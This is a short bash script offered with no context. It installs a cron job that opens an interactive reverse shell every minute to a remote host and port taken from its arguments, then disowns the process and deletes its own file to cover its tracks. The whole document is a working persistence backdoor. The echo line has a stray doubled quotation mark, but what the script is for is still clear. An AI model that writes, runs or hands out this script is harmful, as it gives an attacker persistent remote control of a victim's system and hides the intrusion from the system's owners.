#!/bin/bash
A="$0"
(crontab -l 2> /dev/null; echo ""* * * * * bash -i >& /dev/tcp/$1/$2 0>&1") | crontab -
disown $!
rm -f "$A"
